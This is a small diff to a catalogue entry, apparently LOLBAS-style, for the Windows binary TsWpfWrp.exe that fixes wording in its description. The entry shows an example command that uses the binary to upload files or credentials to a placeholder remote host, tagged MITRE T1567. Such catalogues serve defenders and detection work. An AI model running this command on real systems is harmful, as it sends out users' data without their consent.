@@ -5,8 +5,8 @@ Author: Avihay Eldad
 Created: 2024-04-25
 Commands:
   - Command: TsWpfWrp.exe http://example.com/ExfilData blabla
-    Description: Upload file, credentials or data exfiltration in general
-    Usecase: Exfilitrate data to remote server
+    Description: Upload file, credentials, or data exfiltration in general
+    Usecase: Exfiltrate data to a remote server
     Category: Upload
     Privileges: User
     MitreID: T1567
@@ -21,4 +21,3 @@ Acknowledgement:
     Handle: '@AvihayEldad'
   - Person: Sagi Dinar
     Handle: '@DinarSagi'
-    
